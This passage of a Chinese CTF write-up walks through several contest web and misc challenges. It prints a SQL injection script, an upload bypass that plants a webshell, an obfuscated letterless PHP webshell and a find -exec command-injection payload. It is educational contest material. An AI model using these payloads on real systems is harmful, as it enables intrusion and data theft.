main()</span></span><br><span class="line">    <span class="comment"># getflag()</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 多线程</span></span><br><span class="line">    got()</span><br></pre></td></tr></table></figure>
<h3 id="极光实验室招新报名表"><a href="#极光实验室招新报名表" class="headerlink" title="极光实验室招新报名表"></a>极光实验室招新报名表</h3><h4 id="考点-3"><a href="#考点-3" class="headerlink" title="考点"></a>考点</h4><p>update 注入</p>
<h4 id="预备知识-3"><a href="#预备知识-3" class="headerlink" title="预备知识"></a>预备知识</h4><p><a href="https://www.anquanke.com/post/id/85487" target="_blank" rel="noopener">https://www.anquanke.com/post/id/85487</a></p>
<h4 id="解题过程-3"><a href="#解题过程-3" class="headerlink" title="解题过程"></a>解题过程</h4><p>暴力sha1脚本，没错验证码只是数字而已，出题人不会为难你们跑那么久的，几分钟就跑出来了，如果用多线程就更快了。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> datetime</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sha1</span><span class="params">(s)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.sha1(str(s).encode(<span class="string">'utf-8'</span>)).hexdigest()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">(s)</span>:</span></span><br><span class="line">    starttime = datetime.datetime.now()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10000000</span>,<span class="number">99999999</span>):</span><br><span class="line">        <span class="keyword">if</span>(sha1(i)[<span class="number">-8</span>:] == str(s)):</span><br><span class="line">            print(i)</span><br><span class="line">            endtime = datetime.datetime.now()</span><br><span class="line">            print((endtime - starttime).seconds)</span><br><span class="line">            exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main(<span class="string">"a8f38a0c"</span>)</span><br></pre></td></tr></table></figure></p>
<p>注册好后，登录后可以填写报名表，填写后名字有回显，所以考虑下是不是update 注入 ， 盲注应该也可以，但比起update注入来说太慢了。</p>
<p>过滤不多，主要是or<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">"/(if|or|%20|\||\"|%0a|substr|pass|uid|content|salt|sleep|benchmark|ascii|outfile|dumpfile|load_file|join)/i"</span>, $name))</span><br><span class="line">	&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"you bad bad!"</span>);</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure></p>
<p>过滤了or ，不能用information数据库，可以用 innodb_table_stats</p>
<p>但innodb没有表的字段名，可以用表别名，然后跑出各个字段内容，来猜测flag在哪个字段里</p>
<p>如果参加过四月份的国赛，应该没有难度</p>
<p>利用脚本<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> binascii  </span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://140.82.19.20:10010/'</span></span><br><span class="line"><span class="comment"># url = 'http://202.197.58.168:10010/'</span></span><br><span class="line">login_url = url+<span class="string">"login.php?action=deal"</span></span><br><span class="line">update_url = url+<span class="string">"join.php?action=deal"</span></span><br><span class="line">getdata_url = url+<span class="string">"index.php?action=join"</span></span><br><span class="line">s = requests.session()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">()</span>:</span></span><br><span class="line">    datas=&#123;</span><br><span class="line">        <span class="string">'lo_uid'</span>:<span class="string">''</span>, <span class="comment">#账号</span></span><br><span class="line">        <span class="string">'lo_pw'</span>:<span class="string">''</span> <span class="comment">#密码</span></span><br><span class="line">    &#125;</span><br><span class="line">    r =  s.post(url=login_url,data=datas)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getTable</span><span class="params">()</span>:</span></span><br><span class="line">    flag = <span class="string">''</span></span><br><span class="line">    payload=<span class="string">'0\'^conv(hex(mid((select group_concat(F.1) from (select 1 union select table_name from mysql.innodb_table_stats where database_name=database())F limit 1),%s,8)),16,10)#'</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">2</span>):</span><br><span class="line">        payload_data = (payload%(<span class="number">1</span>+(i<span class="number">-1</span>)*<span class="number">8</span>)).replace(<span class="string">" "</span>,<span class="string">"/**/"</span>)</span><br><span class="line">        datas=&#123;</span><br><span class="line">            <span class="string">'name'</span>:payload_data,</span><br><span class="line">            <span class="string">'content'</span>:<span class="string">'123'</span></span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        r = s.post(url=update_url,data=datas)</span><br><span class="line">        </span><br><span class="line">        r = s.get(url=getdata_url)</span><br><span class="line">        index = str(r.text).find(<span class="string">"value"</span>)</span><br><span class="line">        text  = hex(int(str(r.text)[index+<span class="number">7</span>:index+<span class="number">21</span>]))</span><br><span class="line">        <span class="comment"># print(text)</span></span><br><span class="line">        data = binascii.a2b_hex(text[<span class="number">2</span>:])</span><br><span class="line">        flag+=str(data)[<span class="number">2</span>:<span class="number">-1</span>]</span><br><span class="line">    print(flag)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getdata</span><span class="params">()</span>:</span></span><br><span class="line">    flag = <span class="string">''</span></span><br><span class="line">    payload=<span class="string">'0\'^conv(hex(mid((select group_concat(F.5) from (select 1,2,3,4,5 union select * from user)F limit 1),%s,8)),16,10)#'</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">7</span>):</span><br><span class="line">        payload_data = (payload%(<span class="number">1</span>+(i<span class="number">-1</span>)*<span class="number">8</span>)).replace(<span class="string">" "</span>,<span class="string">"/**/"</span>)</span><br><span class="line">        datas=&#123;</span><br><span class="line">            <span class="string">'name'</span>:payload_data,</span><br><span class="line">            <span class="string">'content'</span>:<span class="string">'123'</span></span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        r = s.post(url=update_url,data=datas)</span><br><span class="line">        </span><br><span class="line">        r = s.get(url=getdata_url)</span><br><span class="line">        index = str(r.text).find(<span class="string">"value"</span>)</span><br><span class="line">        text = filter(str.isdigit,str(r.text)[index+<span class="number">7</span>:index+<span class="number">26</span>])</span><br><span class="line">        texts = <span class="string">''</span>.join(list(text))</span><br><span class="line">        print(texts)</span><br><span class="line">        texts  = hex(int(texts))</span><br><span class="line">        <span class="comment"># print(text)</span></span><br><span class="line">        data = binascii.a2b_hex(texts[<span class="number">2</span>:])</span><br><span class="line">        flag+=str(data)[<span class="number">2</span>:<span class="number">-1</span>]</span><br><span class="line">        <span class="comment"># print(data)</span></span><br><span class="line">    print(flag)</span><br><span class="line">login()</span><br><span class="line">getTable()</span><br><span class="line">getdata()</span><br></pre></td></tr></table></figure></p>
<h3 id="upload-something"><a href="#upload-something" class="headerlink" title="upload something"></a>upload something</h3><h4 id="考点-4"><a href="#考点-4" class="headerlink" title="考点"></a>考点</h4><p>CVE-2017-15715</p>
<h4 id="预备知识-4"><a href="#预备知识-4" class="headerlink" title="预备知识"></a>预备知识</h4><p><a href="https://www.leavesongs.com/PENETRATION/apache-cve-2017-15715-vulnerability.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/apache-cve-2017-15715-vulnerability.html</a></p>
<h4 id="解题过程-4"><a href="#解题过程-4" class="headerlink" title="解题过程"></a>解题过程</h4><p>上传一个php文件，里面是一句话木马<br>利用burpsuit改包</p>
<p><img src="https://i.imgur.com/yEPgTZY.png" alt></p>
<p>利用burpsuite 修改参数name， 在hex中添加一个byte  0a</p>
<p><img src="https://i.imgur.com/w5VJQ8n.png" alt></p>
<p>上传成功，<br>利用菜刀连接，查看目录</p>
<p><img src="https://i.imgur.com/ZwC1sO8.png" alt></p>
<p>得到flag<br><img src="https://i.imgur.com/epr2vKs.png" alt></p>
<h3 id="badip"><a href="#badip" class="headerlink" title="badip"></a>badip</h3><h4 id="考点-5"><a href="#考点-5" class="headerlink" title="考点"></a>考点</h4><p>php伪协议读源码<br>不带数字和字母的shell<br>短标签</p>
<h4 id="预备知识-5"><a href="#预备知识-5" class="headerlink" title="预备知识"></a>预备知识</h4><p><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html</a></p>
<h4 id="解题过程-5"><a href="#解题过程-5" class="headerlink" title="解题过程"></a>解题过程</h4><p>首先打开后链接后自动跳转到了一个查询页面，但修改查询参数id后会有回显”Your ip is recorded in xxxxxxxx.txt“，看到这样的提示，应该就要想到前面的sql注入只是个幌子，实际上是写入木马，但这里就有两个问题了，一、txt文件该如何读取。二、该如何修改ip，是否有过滤。</p>
<p>那么要么是自己头铁，自己试出源码来，又或者想想，有没有什么敏感文件。那么就在robots.txt中发现了include.php和phpinfo.php。看到了include就想到了是写入txt，然后包含即可。访问include.php发现出题人很良心的告诉了源码，还一点过滤都没有，那么就可以通过php伪协议来获取源码了。（然鹅这里有个坑了出题人的坑，出题人设置了ini_set(“include_path”, “./:./record/“)，但是没有生效，实际上是可以直接包含外面的文件的，还出了个超级简单的非预期解，后来出题人偷懒，将flag文件的名字改成了一长串的字符）</p>
<p><code>php://filter/read=convert.base64-encode/resource=index.php</code></p>
<p><img src="https://i.imgur.com/nstlviC.png" alt></p>
<p>base64解码后</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">ini_set(<span class="string">"include_path"</span>, <span class="string">"./:./record/"</span>);</span><br><span class="line">header(<span class="string">"Content-Type: text/html; charset=utf-8"</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_client_ip</span><span class="params">()</span></span>&#123;</span><br><span class="line">    $ip = $_SERVER[<span class="string">'REMOTE_ADDR'</span>];</span><br><span class="line">    <span class="keyword">if</span>(array_key_exists(<span class="string">'HTTP_CLIENT_IP'</span>, $_SERVER))&#123;</span><br><span class="line">        $ip = $_SERVER[<span class="string">'HTTP_CLIENT_IP'</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>($ip)&#123;</span><br><span class="line">        <span class="keyword">list</span>($ip) = explode(<span class="string">', '</span>, $ip, <span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $ip;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$id = @$_GET[<span class="string">"id"</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!$id)&#123;</span><br><span class="line">    header(<span class="string">"Location: index.php?id=1"</span>); </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">"/(#|\"|'|sleep|benchmark|outfile|dumpfile|load_file|join)/i"</span> , $id))&#123;</span><br><span class="line">    $ip = get_client_ip();</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">'/[a-z0-9]/is'</span>,$ip)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"you bad bad ~ "</span>;</span><br><span class="line">        <span class="keyword">die</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    $filename = md5(time());</span><br><span class="line">    $file = fopen(<span class="string">"record/"</span>.$filename.<span class="string">".txt"</span>, <span class="string">"w"</span>);</span><br><span class="line">    fwrite($file,$ip);</span><br><span class="line">    fclose($file);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Your ip is recorded in "</span>.<span class="string">"record/"</span>.$filename.<span class="string">".txt"</span>;</span><br><span class="line">    <span class="keyword">die</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$mysqli = <span class="keyword">new</span> mysqli(<span class="string">"localhost"</span>,<span class="string">"root"</span>,<span class="string">""</span>,<span class="string">"test"</span>);</span><br><span class="line"><span class="keyword">if</span>(mysqli_connect_error())&#123;</span><br><span class="line">    <span class="keyword">echo</span> mysqli_connect_error();</span><br><span class="line">    <span class="keyword">die</span>;</span><br><span class="line">&#125;</span><br><span class="line">$mysqli-&gt;set_charset(<span class="string">"utf8"</span>);</span><br><span class="line">$sql = <span class="string">"select * from user where id=?"</span>;</span><br><span class="line">$stmt = $mysqli-&gt;prepare($sql);</span><br><span class="line">$stmt-&gt;bind_param(<span class="string">"i"</span>, intval($id));</span><br><span class="line">$stmt-&gt;execute();</span><br><span class="line">$result = $stmt-&gt;get_result();</span><br><span class="line"><span class="keyword">while</span>($data = $result-&gt;fetch_array(MYSQLI_ASSOC))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;h1&gt;id : "</span> . $data[<span class="string">'id'</span>] . <span class="string">"&lt;/h1&gt;"</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;h2&gt;name : "</span> . $data[<span class="string">'name'</span>] . <span class="string">"&lt;/h2&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line">$result-&gt;close();</span><br><span class="line">$mysqli-&gt;close();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>看到这个sql查询是用了预编译的，先不理。（当然，这里有sql的账号和密码，貌似可以通过mysql做些什么，但是题目是通过docker搭建的，3306端口无法访问，所以就别想这些骚操作了）然后发现对id进行了正则匹配，只要含有那几个字符就会记录ip地址，并且获取ip的消息头都已经提供了，用client-ip设置即可。</p>
<p>但又来了一个难点，就是preg_match(‘/[a-z0-9]/is’,$ip)，好吧，其实不算难点，看到这样的过滤，就应该想到p神的不包含数字和字母的webshell（<a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html</a>），p神提供了三种webshell，但是这里又有一个坑，由于使用头消息传递数据，所以是不会进行url编码，所以方法一使用不可打印字符异或就不好弄了，而方法二的中文字符也有问题。所以唯一能使用的就是方法三了。</p>
<p>shell的问题解决了，但是大家都知道，shell的使用还需要<code>&lt;?php ?&gt;</code>来作为标签，但是这里不允许输入字母。这时候就到了之前robots.txt文件中没有用到的phpinfo.php了，发现里面的短标签是开着的，那说明可以用<code>&lt;? ?&gt;</code>来代替<code>&lt;?php ?&gt;</code>。</p>
<p><img src="https://i.imgur.com/qmFyfQa.png" alt></p>
<p>所以写入的shell如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>  $_=[];$_=@<span class="string">"$_"</span>; $_=$_[<span class="string">'!'</span>==<span class="string">'@'</span>]; $___=$_; $__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__; $___.=$__; $__=$_;$__++;$__++;$__++;$__++; $___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; $___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; $___.=$__;$____=<span class="string">'_'</span>;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; $____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; $____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; $____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; $____.=$__;$_=$$____;$___($_[_]);  <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://i.imgur.com/O9FglPq.png" alt></p>
<p>然后通过文件包含即可<br><img src="https://i.imgur.com/dkAiKoK.png" alt><br><img src="https://i.imgur.com/ukaLE44.png" alt></p>
<h3 id="different"><a href="#different" class="headerlink" title="different"></a>different</h3><h4 id="考点-6"><a href="#考点-6" class="headerlink" title="考点"></a>考点</h4><p>敏感文件泄露<br>cat指令的利用</p>
<h4 id="预备知识-6"><a href="#预备知识-6" class="headerlink" title="预备知识"></a>预备知识</h4><p><a href="http://39.108.99.6/article/Red-hat-awd.pdf" target="_blank" rel="noopener">http://39.108.99.6/article/Red-hat-awd.pdf</a></p>
<h4 id="解题过程-6"><a href="#解题过程-6" class="headerlink" title="解题过程"></a>解题过程</h4><p>这题的思路来自学长的博客（<a href="http://39.108.99.6/article/Red-hat-awd.pdf）" target="_blank" rel="noopener">http://39.108.99.6/article/Red-hat-awd.pdf）</a></p>
<p>首先访问目标网站发现是个WordPress，并且版本什么的都知道了，可以去找找该版本的漏洞。</p>
<p><img src="https://i.imgur.com/F4yQP30.png" alt></p>
<p>但是没有找到，那么就要找找别的思路了。那么，惯例开始扫描，然后扫出了个<a href="http://www.zip，解压后发现居然是全站的源码，惊不惊喜，意不意外。然后居然有一整个网站的源码，这是要看死你们。但实际上可以去官网下载一个相应版本的WordPress4.9.5的源码。然后通过对比扫描，查看两者有何区别，这样就不用看源码了。" target="_blank" rel="noopener">www.zip，解压后发现居然是全站的源码，惊不惊喜，意不意外。然后居然有一整个网站的源码，这是要看死你们。但实际上可以去官网下载一个相应版本的WordPress4.9.5的源码。然后通过对比扫描，查看两者有何区别，这样就不用看源码了。</a></p>
<p><img src="https://i.imgur.com/PGgLPwf.png" alt></p>
<p>发现修改为下面这样，增加一个debug，会将输入拼接，然后使用system函数执行。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">if ( !in_array( $action, array( &apos;postpass&apos;, &apos;logout&apos;, &apos;lostpassword&apos;, &apos;retrievepassword&apos;, &apos;resetpass&apos;, &apos;rp&apos;, &apos;register&apos;, &apos;login&apos; , &apos;debug&apos; ), true ) &amp;&amp; false === has_filter( &apos;login_form_&apos; . $action ) )</span><br><span class="line">	$action = &apos;login&apos;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">case &apos;debug&apos; :</span><br><span class="line">	$file = addslashes($_POST[&apos;file&apos;]);</span><br><span class="line">	system(&quot;find /tmp -name &quot;.escapeshellcmd($file));</span><br><span class="line">	break;</span><br></pre></td></tr></table></figure>
<p>但是这里首先有addslashes() 函数，</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">addslashes()函数返回在预定义字符之前添加反斜杠的字符串。预定义字符是有单引号（&apos;），双引号（&quot;），反斜杠（\），NULL。</span><br></pre></td></tr></table></figure>
<p>然后又有escapeshellcmd() 函数</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">escapeshellcmd()函数对字符串中可能会欺骗shell 命令执行任意命令的字符进行转义。 此函数保证用户输入的数据在传送到 exec()或 system() 函数，或者执行操作符之前进行转义。</span><br><span class="line">反斜线（\）会在以下字符之前插入： &amp;#;`|*?~&lt;&gt;^()[]&#123;&#125;$\,\x0A 和 \xFF。 &apos; 和 &quot; 仅在不配对儿的时候被转义。 在 Windows平台上，所有这些字符以及 % 和 ! 字符都会被空格代替。</span><br></pre></td></tr></table></figure>
<p>而find命令，如果想多执行别的命令，可以利用-or，并且-exec 参数后面跟的是command命令，该命令的终止是以;为结束标志的，并且要注意前面的空格，所以这句命令后面的分号是不可缺少的，考虑到各个系统中分号会有不同的意义，所以前面加反斜杠。<br><img src="https://i.imgur.com/p4GqKDC.png" alt></p>
<p>所以可以构造payload为：<code>find /tmp -iname sth -or -exec ls \;</code></p>
<p>所以我们的输入为：<code>sth -or -exec ls / ;</code>，这里没有<code>\</code>，是因为上一个函数自动帮你加了<code>\</code>。<br><img src="https://i.imgur.com/c9vILWU.png" alt></p>
<p>读取flag文件，获取flag。<br><img src="https://i.imgur.com/Xuit4kM.png" alt></p>
<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="regular-expression0"><a href="#regular-expression0" class="headerlink" title="regular_expression0"></a>regular_expression0</h3><p>ECMA正则表达式可以认为就是一个比较基础的DFA，这里直接给解了。<br>同时推荐了解一下Regex golf这个游戏，虽然没有实际的意义，但是好玩啊。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">^[^o]+$</span><br><span class="line">^(?!(..+)\1+$)</span><br><span class="line">^(?!(.(..)+)\1*$)</span><br></pre></td></tr></table></figure>
<h3 id="regular-expression1"><a href="#regular-expression1" class="headerlink" title="regular_expression1"></a>regular_expression1</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">^(x+)(x+)-\2=\1$</span><br><span class="line">^(.*)(.*)(.*)=\1\3\2$</span><br><span class="line">\((x+)\1*,\1*\)=\1$</span><br><span class="line">^([0369]|[258][0369]*[147]|([147]|[258][0369]*[258])([0369]|[147][0369]*[258])*([258]|[147][0369]*[147]))*$</span><br><span class="line">^((?=(x*).*(?=x&#123;4&#125;(x&#123;5&#125;(\2&#123;5&#125;))(?=\3*$)\4+$)(|x&#123;4&#125;)(?=xx(x*)(\6x?))\5(x(x*))(?=(\8*)\9+$)(?=\8*$\10)\8*(?=(x\2\9+$))(x*)\12)\7\11(\6\11\12)|x&#123;0,3&#125;|x&#123;5&#125;|x&#123;8&#125;|x&#123;21&#125;)$ (?# Theoretical solution but too slow</span><br><span class="line">^(x|xx|xxx|x&#123;5&#125;|x&#123;8&#125;|x&#123;13&#125;|x&#123;21&#125;|x&#123;34&#125;|x&#123;55&#125;|x&#123;89&#125;|x&#123;144&#125;|x&#123;233&#125;|x&#123;377&#125;|x&#123;610&#125;|x&#123;987&#125;|x&#123;1597&#125;|x&#123;2584&#125;|x&#123;4181&#125;|x&#123;6765&#125;)$</span><br></pre></td></tr></table></figure>
<h3 id="half"><a href="#half" class="headerlink" title="half"></a>half</h3><p>这题确实有点难度，首先获得图片，查看源码，会发现里面还藏着一张图片，只是没有文件头，那么尝试把现有图片的文件头放上去即可，如此即可获得两张照片，并且这两张照片还是一模一样的。两张一模一样的图片，就应该要想到盲水印，去github上（<a href="https://github.com/chishaxie/BlindWaterMark" target="_blank" rel="noopener">https://github.com/chishaxie/BlindWaterMark</a>）下载下来，放到Linux（或kali）中，将两张照片放进去，输入<code>python bwm.py decode half.png half-mang.png shuchu.png</code>，half.png为本来给的图片，half-mang.png为从图片中获取的图片。</p>
<p><img src="https://i.imgur.com/3xiR6pV.png" alt></p>
<p>发现以下内容，很明显只有flag的一半，那么剩下的一半去哪了。</p>
<p><img src="https://i.imgur.com/rFFWCxD.png" alt></p>
<p>png图片还有什么常见的隐写方法，就都试试，最后发现剩下一半的flag在LSB中，不过要用GBR的顺序排列。</p>
<p><img src="https://i.imgur.com/Y4qiKt6.png" alt></p>
<p>最后合并两个flag即可。</p>
<h3 id="nc"><a href="#nc" class="headerlink" title="nc"></a>nc</h3><p>题目只给了一个流量包，打开后发现一个较大的数据包</p>
<p><img src="https://i.imgur.com/VYZQMKM.png" alt></p>
<p>提取数据（复制为纯文本），再base64解密获得源码。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> time,sys</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> FLAG</span><br><span class="line"></span><br><span class="line">server_port = <span class="number">4399</span></span><br><span class="line"></span><br><span class="line">key = int(time.time())</span><br><span class="line"><span class="keyword">print</span> <span class="string">"using key: %d"</span> % key</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hash512</span><span class="params">(s)</span>:</span></span><br><span class="line">    h = hashlib.sha512()</span><br><span class="line">    h.update(str(s).encode(<span class="string">"utf-8"</span>))</span><br><span class="line">    <span class="keyword">return</span> h.hexdigest()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">str2int</span><span class="params">(s)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> int(<span class="string">""</span>.join([str(ord(c)) <span class="keyword">for</span> c <span class="keyword">in</span> s]))</span><br><span 